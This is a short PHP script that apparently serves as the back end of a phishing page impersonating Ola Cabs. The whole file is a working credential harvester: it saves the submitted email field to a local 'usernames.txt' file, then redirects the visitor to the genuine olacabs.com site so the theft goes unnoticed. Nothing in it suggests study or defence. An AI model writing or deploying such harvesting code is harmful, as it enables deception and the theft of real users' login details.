<?php
file_put_contents("usernames.txt", "Username: " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: https://www.olacabs.com/');
?>